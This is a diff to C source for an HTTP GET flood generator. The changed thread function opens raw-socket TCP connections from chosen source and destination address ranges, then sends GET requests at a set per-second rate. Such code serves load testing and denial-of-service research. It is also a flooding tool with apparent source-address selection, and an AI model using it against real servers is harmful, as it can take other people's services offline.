@@ -42,54 +42,49 @@ void get_flood_print_usage(void) {
 }
 
 void* generate_get_flood(void *data) {
+	srand(time(NULL));
 	int thread_id = *((int*) data);
-	// make tcp connection
 
-	generator(g_get_src_ip, g_get_dest_ip, g_get_src_mask, g_get_dest_mask,
-			g_get_dest_port_start, g_get_dest_port_end, g_get_now_src_ip,
-			g_get_now_dest_ip, &g_get_now_dest_port);
-
-	pthread_mutex_lock(&g_get_mutex);
-	int src_port;
-
-	int sock = tcp_make_connection(inet_addr(g_get_now_src_ip),
-			inet_addr(g_get_now_dest_ip), &src_port, g_get_now_dest_port);
-	if (sock == -1) {
-		perror("sock creation failed\n");
-	}
-
-	pthread_mutex_unlock(&g_get_mutex);
-	/*struct sockaddr_in servaddr;
-	 servaddr.sin_family = AF_INET;
-	 servaddr.sin_addr.s_addr = inet_addr(g_get_dest_ip);
-	 servaddr.sin_port = htons(g_get_dest_port_start);
-	 if (connect(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
-	 perror("connect failed\n");
-	 }*/
-
+	clock_t thread_clock;
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_get_mutex);
+
 		// wait a second
 		if (g_get_num_generated_in_sec >= g_get_request_per_sec) {
 			pthread_cond_wait(&g_get_cond, &g_get_mutex);
 		}
+
+		// get now resource
+		generator(g_get_src_ip, g_get_dest_ip, g_get_src_mask, g_get_dest_mask,
+				g_get_dest_port_start, g_get_dest_port_end, g_get_now_src_ip,
+				g_get_now_dest_ip, &g_get_now_dest_port);
+
+		// make and do tcp connection using raw socket
+		int src_port, seq, ack;
+		int sock = tcp_make_connection(inet_addr(g_get_now_src_ip),
+				inet_addr(g_get_now_dest_ip), &src_port, g_get_now_dest_port,
+				&seq, &ack);
+
+		//send HTTP GET method
+		tcp_socket_send_data(sock, inet_addr(g_get_now_src_ip),
+					inet_addr(g_get_now_dest_ip), src_port, g_get_now_dest_port,
+					GET_METHOD, strlen(GET_METHOD), seq, ack);
+
 		// time checking
 		time_check(&g_get_mutex, &g_get_cond, &g_get_before_time,
 				&g_get_now_time, &g_get_num_generated_in_sec);
-		// send packet
-		//make assembed pakcet then send_packet, original tcp method wont work here...!
 
-
-		send(sock, g_get_request_msg, strlen(g_get_request_msg), 0);
+		//session count
 		g_get_num_generated_in_sec++;
 		g_get_num_total++;
-		//printf("%lu Get msg sent\n", g_get_num_generated_in_sec);
+
+		close(sock);
+
 		// *** end of critical section ***
 		pthread_mutex_unlock(&g_get_mutex);
 	}
-	close(sock);
-	return NULL;
+
 }
 
 void* get_flood_time_check(void *data) {
